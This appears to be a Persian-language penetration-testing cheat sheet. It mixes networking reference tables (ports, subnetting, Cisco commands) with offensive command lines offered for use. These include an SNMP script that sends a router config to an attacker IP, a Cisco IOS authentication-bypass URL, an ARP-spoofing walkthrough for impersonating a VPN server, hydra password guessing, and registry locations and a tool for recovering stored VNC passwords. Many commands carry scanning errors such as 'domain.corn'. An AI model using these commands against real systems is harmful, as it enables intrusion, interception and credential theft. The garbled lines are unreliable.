---
layout: default
published: true
---

# شبکه

## پورت های متداول

| شماره | سرویس |
| :--- | :--- |
| 21 | FTP |
| 22 | SSH |
| 23 | Tel net |
| 25 | SMTP |
| 49 | TACACS |
| 53 | DNS |
| 67/8 | DHCP \(UDP\) |
| 69 | TFTP \(UDP\) |
| 80 | HTTP |
| 88 | Kerberos |
| 110 | POP3 |
| 111 | RPC |
| 123 | NTP \(UDP\) |
| 135 | Windows RPC |
| 137 | NetBIOS |
| 138 | NetBIOS |
| 139 | SMB |
| 143 | IMAP |
| 161 | SNMP \(UDP\) |
| 179 | BGP |
| 201 | AppleTalk |
| 389 | LDAP |
| 443 | HTTPS |
| 445 | SMB |
| 500 | ISAKMP \(UDP\) |
| 514 | Syslog |
| 520 | RIP |
| 546/7 | DHCPv6 |
| 587 | SMTP |
| 902 | VMWare |
| 1080 | Socks Proxy |
| 1194 | VPN |
| 1433/4 | MS-SQL |
| 1521 | Oracle |
| 1629 | DarneWare |
| 2049 | NFS |
| 3128 | Squid Proxy |
| 3306 | MySQL |
| 3389 | RDP |
| 5060 | SIP |
| 5222 | Jabber |
| 5432 | Postgres |
| 5666 | Nagios |
| 5900 | VNC |
| 6000 | X11 |
| 6129 | DameWare |
| 6667 | IRC |
| 9001 | Tor |
| 9001 | HSQL |
| 9090/1 | Open fire |
| 9100 | Jet Direct |

## دریافت اطلاعات سیستم عامل با TTL

| os | size |
| :--- | :--- |
| Windows | 128 |
| Linux | 64 |
| Network | 255 |
| Solaris | 255 |

## کدهای وضیعت ftp

| وضیعت | کد |
| :--- | :--- |
| منتظر ورود کاربر | 220 |
| احراز هویت نشده است | 530 |

## کدهای وضیعت http

| وضیعت | کد |
| :--- | :--- |
| اتصال موفقیت آمیز | 200 |
| عدم دسترسی | 403 |


## اطلاعات IPV4

### محدوده Classful

| name | start | end |
| :--- | :--- | :--- |
| A | 0.0.0.0 | 127.255.255.255 |
| B | 128.0.0.0 | 191.255.255.255 |
| C | 192.0.0.0 | 223.255.255.255 |
| D | 224.0.0.0 | 239.255.255.255 |
| E | 240.0.0.0 | 255.255.255.255 |

### محدوده Reversed

| start | end |
| :--- | :--- |
| 10.0.0.0 | 10.255.255.255 |
| 127.0.0.0 | 127.255.255.255 |
| 172.16.0.0 | 172.31.255.255 |
| 192.168.0.0 | 192.168.255.255 |

### Subnetting

|  |  |  |
| :--- | :--- | :--- |
| /31 | 255.255.255.254 | 1 Host |
| /30 | 255.255.255.252 | 2 Hosts |
| /29 | 255.255.255.248 | 6 Hosts |
| /28 | 255.255.255.240 | 14 Hosts |
| /27 | 255.255.255.224 | 30 Hosts |
| /26 | 255.255.255.192 | 62 Hosts |
| /25 | 255.255.255.128 | 126 Hosts |
| /24 | 255.255.255.0 | 254 Hosts |
| /23 | 255.255.254.0 | 510 Hosts |
| /22 | 255.255.252.0 | 1022 Hosts |
| /21 | 255.255.248.0 | 2046 Hosts |
| /20 | 255.255.240.0 | 4096 Hosts |
| /19 | 255.255.224.0 | 8190 Hosts |
| /18 | 255.255.192.0 | 16382 Hosts |
| /17 | 255.255.128.0 | 32766 Hosts |
| /16 | 255.255.0.0 | 65534 Hosts |
| /15 | 255.254.0.0 | 131070 Hosts |
| /14 | 255.252.0.0 | 262142 Hosts |
| /13 | 255.248.0.0 | 524286 Hosts |
| /12 | 255.240.0.0 | 1048574 Hosts |
| /11 | 255.224.0.0 | 2097150 Host |
| /10 | 255.192.0.0 | 4194302 Host |
| /9 | 255.128.0.0 | 8388606 Host |
| /8 | 255.0.0.0 | 16777214 Hosts |

## محاسبه محدوده subnet

```text
Given: 1.1.1.101/28
/28 = 255.255.255.240 netmask
256 - 240 = 16 = subnet ranges of 16, i.e.
    1.1.1.0
    1.1.1.16
    1.1.1.32 ...
Range where given IP falls: 1.1.1.96 - 1.1.1.111
```

## اطلاعات IPV6

### آدرس های Broadcast

```text
ff02::1 - link-local nodes
ff05::1 - site-local nodes
ff01::2 - node-local routers
ff02::2 - link-local routers
ff05::2 - site-local routers
```

### آدرس های Interface

```text
fe80:: -link-local
2001:: - routable
::a.b.c.d- IPv4 compatible IPv6
::ffff:a.b.c.d- IPv4 mapped IPv6
```

### جعبه ابزار ipv6

```text
Remote Network DoS:
rsumrf6 eth# remote ipv6
```

### تونل ipv6 در ipv4  با socat

```text
socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[2001::]:80
./nikto.pl -host 12-.0.0.1 -port 8080
```

## دستورات سیسکو

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">enable</td>
      <td style="text-align:left">فعال سازی حالت privilege</td>
    </tr>
    <tr>
      <td style="text-align:left">#configure terminal</td>
      <td style="text-align:left">تنظیمات interface</td>
    </tr>
    <tr>
      <td style="text-align:left">(config)#interface fa0/0</td>
      <td style="text-align:left">تنظیم FastEthernet 0/0</td>
    </tr>
    <tr>
      <td style="text-align:left">(config-if)#ip addr 1.1.1.1 255.255.255.0</td>
      <td style="text-align:left">تنظیم IP به fa0/0</td>
    </tr>
    <tr>
      <td style="text-align:left">(config)#line Vty 0 4</td>
      <td style="text-align:left">تنظیم خط vty</td>
    </tr>
    <tr>
      <td style="text-align:left">(config-line)#login</td>
      <td style="text-align:left">
        <p></p>
        <p>Set telnet password</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">(config-line)#password password</td>
      <td style="text-align:left">تنظیم کلمه عبور برای telnet</td>
    </tr>
    <tr>
      <td style="text-align:left">#show session</td>
      <td style="text-align:left">بازنمودن جلسه</td>
    </tr>
    <tr>
      <td style="text-align:left">#show version</td>
      <td style="text-align:left">نسخه IOS</td>
    </tr>
    <tr>
      <td style="text-align:left">#dir file systems</td>
      <td style="text-align:left">فایل های موجود</td>
    </tr>
    <tr>
      <td style="text-align:left">#dir all-filesystems</td>
      <td style="text-align:left">اطلاعات فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">#dir /all</td>
      <td style="text-align:left">حذف فایل ها</td>
    </tr>
    <tr>
      <td style="text-align:left">#show running-config</td>
      <td style="text-align:left">تنظیمات داخل memory</td>
    </tr>
    <tr>
      <td style="text-align:left">#show startup-config</td>
      <td style="text-align:left">تنظیمات داخل boot</td>
    </tr>
    <tr>
      <td style="text-align:left">#show ip interface brief</td>
      <td style="text-align:left">لیست Interfaces</td>
    </tr>
    <tr>
      <td style="text-align:left">#show interface e0</td>
      <td style="text-align:left">جزییات اطلاعات interface</td>
    </tr>
    <tr>
      <td style="text-align:left">#show ip route</td>
      <td style="text-align:left">لیست Route ها</td>
    </tr>
    <tr>
      <td style="text-align:left">#show access-lists</td>
      <td style="text-align:left">لیست های دسترسی</td>
    </tr>
    <tr>
      <td style="text-align:left">#terminal length 0</td>
      <td style="text-align:left">هیچ محدودی در خروجی نباشد</td>
    </tr>
    <tr>
      <td style="text-align:left">#copy running-config startup-config</td>
      <td style="text-align:left">جایگذاری تنظیمات از memory به boot</td>
    </tr>
    <tr>
      <td style="text-align:left">#copy running-config tftp</td>
      <td style="text-align:left">کپی از تنظمیات بر روی tftp</td>
    </tr>
  </tbody>
</table>

### آسیب پذیری های  IOS 11.2-12.2 

```text
http:// ip /level/ 16-99 /exec/show/config
```

## SVN

لیست فایل ها و فولدر ها

```text
svn list svn://10.10.10.10/Empty/
```

گزارش های فعالیت ها

```text
svn log svn://10.10.10.10/
```

لیست تغییرات

```text
svn diff -c r2 svn://10.10.10.10
```



## پروتکل SNMP

نیاز به شروع سرویس tftp

```text
./snmpblow.pl -s srcip -d rtr_ip -t attackerip -f out.txt
snmpstrings.txt
```

### لیست سرویس های اجرایی ویندوز  

```text
snrnpwalk -c public -v1 ip 1 | grep hrSWRJnName | cut -d" " -f4
```

### پورت های باز ویندوز

```text
smpwalk | grep tcpConnState | cut -d" " -f6 | sort -u
```

### نرم افزار های نصب شده

```text
smpwalk | grep hrSWinstalledName
```

### کاربران ویندوز

```text
snmpwalk ip 1.3 | grep 77.1.2.25 -f4
```

### فایل های به اشتراک گذاشته شده

```text
snmpwalk -v 1 -c public 10.13.37.10
```

## ضبط Packet 

### ضبط بسته های پورت 22- 23

```text
tcpdump -nvvX -sO -i eth0 tcp portrange 22-23
```

### ضبط ترافیک ip خاص به غیر از subnet

```text
tcpdump -I eth0 -tttt dst ip and not net 1.1.1.0/24
```

### ضبط ترافیک 192.1

```text
tcpdump net 192.1.1
```

### ضبط زمان بندی شده ترافیک 

```text
dumpcap -I eth0 -a duration: sec -w file file.pcap
```

### بررسی Reply PCAP

```text
file2cable -i eth0 -f file.pcap
```

### بررسی Reply packets \(FUZZ \| Dos\)

```text
tcpreplay --topspeed --loop=O --intf=eth0 .pcap_file_to replay rnbps=10|100|1000
```

### دستور DNSRecon

```text
Reverse lookup for IP range:
./dnsrecon.rb -t rvs -i 192.1.1.1,192.1.1.20
Retrieve standard DNS records:
./dnsrecon.rb -t std -d domain.corn
Enumerate subdornains:
./dnsrecon.rb -t brt -d domain.corn -w hosts.txt
DNS zone transfer:
./dnsrecon -d domain.corn -t axfr
```

### عملیات reverse dns lookup و بررسی خروجی با nmap

```text
nmap -R -sL -Pn -dns-servers dns svr ip range | awk '{if( ($1" "$2"
"$3)=="Nmap scan report")print$5" "$6}' | sed 's/(//g' I sed 's/)//g'
dns.txt
```

## VPN

### نوشتن psk بر روی فایل

```text
ike-scan -M -A vpn ip -P file
```

### حمله به سرور vpn

```text
ike-scan -A -t 1 --sourceip= spoof ip dst ip
```

### Fiked - ایجاد سرور vpn تقلبی

```text
Must know the VPN group name a~d pre-shared key;
1. Ettercap filter to drop IPSEC traffic (UDP port 500)
   if(ip.proto == UDP && udp.scc == 500) {
      kill();
      drop();
      msg (" UDP packet dropped ") ;
2. Compile filter
   etterfilter udpdrop.filter -o udpdrop.ef
3. Start Ettercap and drop all IPSEC ~raffic
   #ettercap -T -g -M arp -F udpdrop.ef // //
4. Enable IP Forward
   echo "1" /proc/sys/net/ipv4/ip_forward
5. Configure IPtables to port forward to Fiked server
    iptables -t nat -A PREROUTING -p udp -I eth0 -d VPN Server IP -j
   DNAT - - to Attacking Host IP
    iptables -P FORWARD ACCEP~
6. Start Fiked to impersonate the VPN Server
   fiked - g vpn gatewa; ip - k VPN Group Name:Group Pre-Shared Ke;
7. Stop Ettercap
8. Restart Ettercap without the filter
   ettercap -T -M arp II II
```

### حدس نام کاربری با hydra

```text
hydra -L ~/seclists/Usernames/Names/femalenames-usa-top1000.txt -p Welcome123! IP PROTOCOL
```

### نمایش مسیرهای smb با smbclient

```text
smbclient -U USERNAME -L IP
```

### دسترسی به محیط سیستم با استفاده WRM 

```text
ruby evil-winrm.rb -u USER -p PASS -i IP
```

## هدایت ترافیک های محلی به آدرس مشخص

```text
simpleproxy -L 8000 -R 10.10.10.10:1337
```

## نرم افزار Putty

### کلید رجیستری برای گزارش گیری از هر عملیاتی توسط putty \(حتی دستورات و خروجی ها\)

```text
[HKEY_CURRENT_USER\Software\Si~onTatham\Putt;\Sessions\Default%20Settings]
"LogFileName"="%TEMP%\putty.dat"
"LogType"=dword:00000002"
```

## ldap

### جست و جو اطلاعات مهم ldap با استفاده از impackt

```text
ldapsearch -h <host> -x -b "dc=<dc>,dc=local" 
```

### نمایش تمامی اطلاعات ساختاری ldap

```text
ldapsearch -x -LLL -w PASSWORD
```

## vnc

### رمزگشایی فایل VNC Install.reg

```text
vncpwd.exe <ENCRYPTEDPASSWORD>
```

یا 

```text
RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
Value: Password

TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server
HKLM\SOFTWARE\TightVNC\Server\ControlPassword

tightvnc.ini
vnc_viewer.ini
Value: Password or PasswordViewOnly

TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
Value: Password

UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
Value: passwd or passwd2
```

[اطلاعات بیشتر](https://github.com/frizb/PasswordDecrypts)
